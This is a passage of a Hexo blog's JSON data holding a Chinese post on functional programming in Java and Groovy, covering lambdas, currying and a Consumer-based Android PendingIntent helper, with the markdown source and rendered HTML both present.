PendingIntent.FLAG_UPDATE_CURRENT);\n}\n// 外部调用\nPendingIntent clickI = createActivityI(INTENT_TYPE_TEST, intent -> {\n    intent.setData(xxx);\n    intent.putExtra(xxx);\n    // ...对intent对象各种操作，无需关心内部是如何初始化的（实例化），我们只是外部消费者（consumer）\n});\n```\n\n上面这段代码可能咋一看跟真正的函数式编程并没有什么卵关系，甚至一般的builder模式也能实现。\n\n但我们应该把 **intent -> { ... }** 看成一个λ函数表达式，intent是唯一参数且**不可变**，并且我们应当遵守纯函数的规范，即 **{ ... }** 函数实现内部只对 intent 进行修饰等操作，不应该去做其他无关的事情（比如修改外部变量，甚至是调起其他功能模块等）。\n\n在消费者 `consumer.accept()` 的瞬间，内外互不相知干了什么，天然地做到了业务逻辑隔离。\n\n## 参考\n\n- [函数式编程思想概论](https://www.ibm.com/developerworks/cn/java/j-understanding-functional-programming-1)\n- [柯里化-wiki](https://zh.wikipedia.org/wiki/柯里化)\n- [JavaScript 函数式编程](https://juejin.im/post/5b4ac0d0f265da0fa959a785)\n\n## 请勿滥用\n\n越抽象和高级的东西，内部消耗越大，乃自然之理。虽然函数式编程有很多优点，如可读性好，函数无副作用，参数不可变（理论上适合并行操作，不用考虑死锁，实际上性能不够，是不是挺矛盾的？）等。\n\n但相比指令式编程，大量使用函数式编程，会影响程序性能。不适合做IO密集型操作和一些高性能的UI操作。从Java函数式编程的实现来看，内部也涉及到比较多的函数递归嵌套，给栈区带来一定的压力。\n\n**合理使用：**\n\n平时工作中可以利用函数式编程的理念来简化业务代码，如上文示例，还是蛮好的。\n","slug":"浅谈JVM语言之函数式编程","published":1,"updated":"2024-03-25T07:31:25.863Z","comments":1,"photos":[],"link":"","_id":"cluaufh12002vthe62hgl1ijk","content":"<h2 id=\"Java中的函数式编程\"><a href=\"#Java中的函数式编程\" class=\"headerlink\" title=\"Java中的函数式编程\"></a>Java中的函数式编程</h2><h3 id=\"闲聊\"><a href=\"#闲聊\" class=\"headerlink\" title=\"闲聊\"></a>闲聊</h3><p>函数式编程在上世纪五十年代就有了，只不过在工业界一直不温不火，最近十年才被广泛认知。其理论基础也并非为编程而设计，而是一种数学抽象（Lamda演算），其实初中就学过了，λ表达式。</p>\n<p>在JS（建议把JS作为函数式编程思想学习的入门语言，Java的实现略显臃肿，可能不太便于理解）当中，函数式编程算是应用比较多的了。各现代高级编程语言，都或多或少地支持了函数式编程。</p>\n<h3 id=\"一些基本特点总结\"><a href=\"#一些基本特点总结\" class=\"headerlink\" title=\"一些基本特点总结\"></a>一些基本特点总结</h3><ul>\n<li>相比平常的指令式编程，函数式编程更在乎执行结果而非过程；</li>\n<li>函数是一等公民，可以像普通的数值、引用等变量一样赋值、作为参数传递、作为返回值；</li>\n<li>函数是纯函数，即函数不能产生副作用，如不能修改全局变量等，固定的输入就映射固定的输出。</li>\n</ul>\n<h3 id=\"简单示意一下\"><a href=\"#简单示意一下\" class=\"headerlink\" title=\"简单示意一下\"></a>简单示意一下</h3><p>不代表任何语言，因为不同语言在实现方式上有差异，但核心思想不变：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个函数g，并赋值给f</span></span><br><span class=\"line\">f = g(x, y) = x + y</span><br><span class=\"line\"><span class=\"comment\">// 写一个方法，函数作为参数传递</span></span><br><span class=\"line\">printF(g) &#123;</span><br><span class=\"line\">    print(g(<span class=\"number\">1</span>, <span class=\"number\">2</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 调用方法</span></span><br><span class=\"line\">printF(f) <span class=\"comment\">// 打印结果3</span></span><br><span class=\"line\"><span class=\"comment\">// 作为返回值</span></span><br><span class=\"line\">getF() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Java函数式编程\"><a href=\"#Java函数式编程\" class=\"headerlink\" title=\"Java函数式编程\"></a>Java函数式编程</h3><p>看了上面的示意，是不是能联想到Java的Runnable了？</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Runnable</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> ()-&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">testF</span><span class=\"params\">(Runnable r, <span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">    print(i);</span><br><span class=\"line\">    r.run();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">testF(f, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">// 看这个是不是有点函数式编程的影子了，其实Runnable接口的设计在Java 8之前就有了，还是很有远见的，在此可以把f看成一个无参无返回值的函数，也算是低配版的函数式编程嘛~</span></span><br></pre></td></tr></table></figure>\n\n<p>所以我们在Java 8的编程环境下，经常看到IDE提示new Runnable……可以转化成lamda表达式。</p>\n<p>真正的函数式编程本来Java 7就会支持的，但是甲骨文跳票你懂的，于是functional programming在Java 8才正式推出。从 <code>java.util.function</code> 包即可管中窥豹。</p>\n<p>Java后端开发中早就用烂了，在Android开发中必须API大于等于24才能完全开启Java 8特性（最新：Studio 4.0推出的新版Gradle插件已经支持解糖，不再需要API限制：<a href=\"https://developer.android.com/studio/write/java8-support#library-desugaring\">Java 8+ API desugaring support (Android Gradle Plugin 4.0.0+)</a>）。</p>\n<h3 id=\"Groovy函数式编程\"><a href=\"#Groovy函数式编程\" class=\"headerlink\" title=\"Groovy函数式编程\"></a>Groovy函数式编程</h3><p>Gradle脚本是基于Groovy这门JVM动态语言的，用它来表示函数式编程的概念更加清晰：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> func1 = &#123; msg1 -&gt;</span><br><span class=\"line\">    println <span class=\"string\">&quot;Look func1 $msg1&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> fun2 = &#123; msg2 -&gt;</span><br><span class=\"line\">        println msg2</span><br><span class=\"line\">        <span class=\"string\">&quot;ret fun2&quot;</span> <span class=\"comment\">// 在闭包中最后一行值将直接作为返回结果，加不加return都可</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fun2</span><br><span class=\"line\"><span class=\"comment\">// 等效简化代码</span></span><br><span class=\"line\"><span class=\"comment\">//    return &#123; msg2 -&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//        println msg2</span></span><br><span class=\"line\"><span class=\"comment\">//        &quot;ret fun2&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//    &#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">println func1(<span class=\"string\">&#x27;真的&#x27;</span>)(<span class=\"string\">&#x27;NB&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://imgconvert.csdnimg.cn/2020061010454618.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"柯里化理论基础\"><a href=\"#柯里化理论基础\" class=\"headerlink\" title=\"柯里化理论基础\"></a>柯里化理论基础</h2><p>柯里化是函数式编程的重要特性，简单理解就是把多参函数转化为一个个单一参数的元函数，第一个元函数处理完一个参数后，返回新一个元函数来处理剩下的参数，依此递归，就像工厂的流水线一样工作，各司其职。</p>\n<p>我们平时用到的builder、链式调用，其实都有这种概念在里面。<br>具体原理可以参考资料，还是蛮有意思的：</p>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/c623b8b2aec8\">借助Java 8实现柯里化</a></li>\n<li><a href=\"https://juejin.im/post/5af13664f265da0ba266efcf\">JavaScript 柯里化，了解一下？</a></li>\n</ul>\n<p><strong>Java8柯里化示例：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.IntFunction;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.IntUnaryOperator;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Curry</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Function&lt;Integer, Function&lt;Integer, Function&lt;Integer, Integer&gt;&gt;&gt; CURRYING_1 =</span><br><span class=\"line\">            x -&gt; y -&gt; z -&gt; (x + y) * z;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> IntFunction&lt;IntFunction&lt;IntUnaryOperator&gt;&gt; CURRYING_2 =</span><br><span class=\"line\">            x -&gt; y -&gt; z -&gt; (x + y) * z;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> TriFunction&lt;Integer, Integer, Integer, Integer&gt; CURRYING_3 =</span><br><span class=\"line\">            (x, y, z) -&gt; (x + y) * z;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(CURRYING_1.apply(<span class=\"number\">1</span>).apply(<span class=\"number\">2</span>).apply(<span class=\"number\">3</span>));</span><br><span class=\"line\">        System.out.println(CURRYING_2.apply(<span class=\"number\">1</span>).apply(<span class=\"number\">2</span>).applyAsInt(<span class=\"number\">3</span>));</span><br><span class=\"line\">        System.out.println(CURRYING_3.apply(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@FunctionalInterface</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">TriFunction</span>&lt;U, T, S, R&gt; &#123;</span><br><span class=\"line\">        R <span class=\"title function_\">apply</span><span class=\"params\">(U u, T t, S s)</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"低版本Java兼容实践\"><a href=\"#低版本Java兼容实践\" class=\"headerlink\" title=\"低版本Java兼容实践\"></a>低版本Java兼容实践</h2><p>由于目前大多Android项目的minSDK对应的API等级还是19或者23，且未升级至Studio 4.0，并不能直接使用Java 8的全部特性，因此只能在编码层面进行部分特性的兼容：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// build.gradle</span></span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    compileOptions &#123;</span><br><span class=\"line\">        sourceCompatibility JavaVersion.VERSION_1_8</span><br><span class=\"line\">        targetCompatibility JavaVersion.VERSION_1_8</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不过，我们也可以自己复制 <code>java.util.function</code> 包中的代码来实现函数式编程（比如AndroidX的工具包中就单独实现了Consumer接口），具体可参考 <code>androidx.core.util.Consumer</code> 的相关引用。</p>\n<p>对函数式编程支持程度高低的一个重要特征是函数是否作为编程语言的一等公民出现，也就是编程语言是否有内置的结构来表示函数。作为面向对象的编程语言，Java 中使用接口来表示函数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如Consumer就是一种只接受一个输入，而没有输出的特殊函数</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">Consumer</span>&lt;T&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(T t)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 为通知构建，创建一个PendingIntent</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PendingIntent <span class=\"title function_\">createActivityI</span><span class=\"params\">(<span class=\"type\">int</span> type, Consumer&lt;Intent&gt; consumer)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Context</span> <span class=\"variable\">appCtx</span> <span class=\"operator\">=</span> MyApp.getContext(); <span class=\"comment\">// 获取App全局Context</span></span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (consumer != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        consumer.accept(intent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> PendingIntent.getActivity(appCtx, type, intent, PendingIntent.FLAG_UPDATE_CURRENT);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 外部调用</span></span><br><span class=\"line\"><span class=\"type\">PendingIntent</span> <span class=\"variable\">clickI</span> <span class=\"operator\">=</span> createActivityI(INTENT_TYPE_TEST, intent -&gt; &#123;</span><br><span class=\"line\">    intent.setData(xxx);</span><br><span class=\"line\">    intent.putExtra(xxx);</span><br><span class=\"line\">    <span class=\"comment\">// ...对intent对象各种操作，无需关心内部是如何初始化的（实例化），我们只是外部消费者（consumer）</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>上面这段代码可能咋一看跟真正的函数式编程并没有什么卵关系，甚至一般的builder模式也能实现。</p>\n<p>但我们应该把 <strong>intent -&gt; { … }</strong> 看成一个λ函数表达式，intent是唯一参数且<strong>不可变</strong>，并且我们应当遵守纯函数的规范，即 <strong>{ … }</strong> 函数实现内部只对 intent 进行修饰等操作，不应该去做其他无关的事情（比如修改外部变量，甚至是调起其他功能模块等）。</p>\n<p>在消费者 <code>consumer.accept()</code> 的瞬间，内外互不相知干了什么，天然地做到了业务逻辑隔离。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://www.ibm.com/developerworks/cn/java/j-understanding-functional-programming-1\">函数式编程思想概论</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E6%9F%AF%E9%87%8C%E5%8C%96\">柯里化-wiki</a></li>\n<li><a href=\"https://juejin.im/post/5b4ac0d0f265da0fa959a785\">JavaScript 函数式编程</a></li>\n</ul>\n<h2 id=\"请勿滥用\"><a href=\"#请勿滥用\" class=\"headerlink\" title=\"请勿滥用\"></a>请勿滥用</h2><p>越抽象和高级的东西，内部消耗越大，乃自然之理。虽然函数式编程有很多优点，如可读性好，函数无副作用，参数不可变（理论上适合并行操作，不用考虑死锁，实际上性能不够，是不是挺矛盾的？）等。</p>\n<p>但相比指令式编程，大量使用函数式编程，会影响程序性能。不适合做IO密集型操作和一些高性能的UI操作。从Java函数式编程的实现来看，内部也涉及到比较多的函数递归嵌套，给栈区带来一定的压力。</p>\n<p><strong>合理使用：</strong></p>\n<p>平时工作中可以利用函数式编程的理念来简化业务代码，如上文示例，还是蛮好的。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"Java中的函数式编程\"><a href=\"#Java中的函数式编程\" class=\"headerlink\" title=\"Java中的函数式编程\"></a>Java中的函数式编程</h2><h3 id=\"闲聊\"><a href=\"#闲聊\" class=\"headerlink\" title=\"闲聊\"></a>闲聊</h3><p>函数式编程在上世纪五十年代就有了，只不过在工业界一直不温不火，最近十年才被广泛认知。其理论基础也并非为编程而设计，而是一种数学抽象（Lamda演算），其实初中就学过了，λ表达式。</p>\n<p>在JS（建议把JS作为函数式编程思想学习的入门语言，Java的实现略显臃肿，可能不太便于理解）当中，函数式编程算是应用比较多的了。各现代高级编程语言，都或多或少地支持了函数式编程。</p>\n<h3 id=\"一些基本特点总结\"><a href=\"#一些基本特点总结\" class=\"headerlink\" title=\"一些基本特点总结\"></a>一些基本特点总结</h3><ul>\n<li>相比平常的指令式编程，函数式编程更在乎执行结果而非过程；</li>\n<li>函数是一等公民，可以像普通的数值、引用等变量一样赋值、作为参数传递、作为返回值；</li>\n<li>函数是纯函数，即函数不能产生副作用，如不能修改全局变量等，固定的输入就映射固定的输出。</li>\n</ul>\n<h3 id=\"简单示意一下\"><a href=\"#简单示意一下\" class=\"headerlink\" title=\"简单示意一下\"></a>简单示意一下</h3><p>不代表任何语言，因为不同语言在实现方式上有差异，但核心思想不变：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个函数g，并赋值给f</span></span><br><span class=\"line\">f = g(x, y) = x + y</span><br><span class=\"line\"><span class=\"comment\">// 写一个方法，函数作为参数传递</span></span><br><span class=\"line\">printF(g) &#123;</span><br><span class=\"line\">    print(g(<span class=\"number\">1</span>, <span class=\"number\">2</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 调用方法</span></span><br><span class=\"line\">printF(f) <span class=\"comment\">// 打印结果3</span></span><br><span class=\"line\"><span class=\"comment\">// 作为返回值</span></span><br><span class=\"line\">getF() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Java函数式编程\"><a href=\"#Java函数式编程\" class=\"headerlink\" title=\"Java函数式编程\"></a>Java函数式编程</h3><p>看了上面的示意，是不是能联想到Java的Runnable了？</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Runnable</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> ()-&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">testF</span><span class=\"params\">(Runnable r, <span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">    print(i);</span><br><span class=\"line\">    r.run();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">testF(f, <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">// 看这个是不是有点函数式编程的影子了，其实Runnable接口的设计在Java 8之前就有了，还是很有远见的，在此可以把f看成一个无参无返回值的函数，也算是低配版的函数式编程嘛~</span></span><br></pre></td></tr></table></figure>\n\n<p>所以我们在Java 8的编程环境下，经常看到IDE提示new Runnable……可以转化成lamda表达式。</p>\n<p>真正的函数式编程本来Java 7就会支持的，但是甲骨文跳票你懂的，于是functional programming在Java 8才正式推出。从 <code>java.util.function</code> 包即可管中窥豹。</p>\n<p>Java后端开发中早就用烂了，在Android开发中必须API大于等于24才能完全开启Java 8特性（最新：Studio 4.0推出的新版Gradle插件已经支持解糖，不再需要API限制：<a href=\"https://developer.android.com/studio/write/java8-support#library-desugaring\">Java 8+ API desugaring support (Android Gradle Plugin 4.0.0+)</a>）。</p>\n<h3 id=\"Groovy函数式编程\"><a href=\"#Groovy函数式编程\" class=\"headerlink\" title=\"Groovy函数式编程\"></a>Groovy函数式编程</h3><p>Gradle脚本是基于Groovy这门JVM动态语言的，用它来表示函数式编程的概念更加清晰：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> func1 = &#123; msg1 -&gt;</span><br><span class=\"line\">    println <span class=\"string\">&quot;Look func1 $msg1&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> fun2 = &#123; msg2 -&gt;</span><br><span class=\"line\">        println msg2</span><br><span class=\"line\">        <span class=\"string\">&quot;ret fun2&quot;</span> <span class=\"comment\">// 在闭包中最后一行值将直接作为返回结果，加不加return都可</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fun2</span><br><span class=\"line\"><span class=\"comment\">// 等效简化代码</span></span><br><span class=\"line\"><span class=\"comment\">//    return &#123; msg2 -&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//        println msg2</span></span><br><span class=\"line\"><span class=\"comment\">//        &quot;ret fun2&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//    &#125;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">println func1(<span class=\"string\">&#x27;真的&#x27;</span>)(<span class=\"string\">&#x27;NB&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://imgconvert.csdnimg.cn/2020061010454618.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"柯里化理论基础\"><a href=\"#柯里化理论基础\" class=\"headerlink\" title=\"柯里化理论基础\"></a>柯里化理论基础</h2><p>柯里化是函数式编程的重要特性，简单理解就是把多参函数转化为一个个单一参数的元函数，第一个元函数处理完一个参数后，返回新一个元函数来处理剩下的参数，依此递归，就像工厂的流水线一样工作，各司其职。</p>\n<p>我们平时用到的builder、链式调用，其实都有这种概念在里面。<br>具体原理可以参考资料，还是蛮有意思的：</p>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/c623b8b2aec8\">借助Java 8实现柯里化</a></li>\n<li><a href=\"https://juejin.im/post/5af13664f265da0ba266efcf\">JavaScript 柯里化，了解一下？</a></li>\n</ul>\n<p><strong>Java8柯里化示例：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.Function;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.IntFunction;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.function.IntUnaryOperator;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Curry</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Function&lt;Integer, Function&lt;Integer, Function&lt;Integer, Integer&gt;&gt;&gt; CURRYING_1 =</span><br><span class=\"line\">            x -&gt; y -&gt; z -&gt; (x + y) * z;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> IntFunction&lt;IntFunction&lt;IntUnaryOperator&gt;&gt; CURRYING_2 =</span><br><span class=\"line\">            x -&gt; y -&gt; z -&gt; (x + y) * z;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> TriFunction&lt;Integer, Integer, Integer, Integer&gt; CURRYING_3 =</span><br><span class=\"line\">            (x, y, z) -&gt; (x + y) * z;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(CURRYING_1.apply(<span class=\"number\">1</span>).apply(<span class=\"number\">2</span>).apply(<span class=\"number\">3</span>));</span><br><span class=\"line\">        System.out.println(CURRYING_2.apply(<span class=\"number\">1</span>).apply(<span class=\"number\">2</span>).applyAsInt(<span class=\"number\">3</span>));</span><br><span class=\"line\">        System.out.println(CURRYING_3.apply(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@FunctionalInterface</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">TriFunction</span>&lt;U, T, S, R&gt; &#123;</span><br><span class=\"line\">        R <span class=\"title function_\">apply</span><span class=\"params\">(U u, T t, S s)</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"低版本Java兼容实践\"><a href=\"#低版本Java兼容实践\" class=\"headerlink\" title=\"低版本Java兼容实践\"></a>低版本Java兼容实践</h2><p>由于目前大多Android项目的minSDK对应的API等级还是19或者23，且未升级至Studio 4.0，并不能直接使用Java 8的全部特性，因此只能在编码层面进行部分特性的兼容：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span 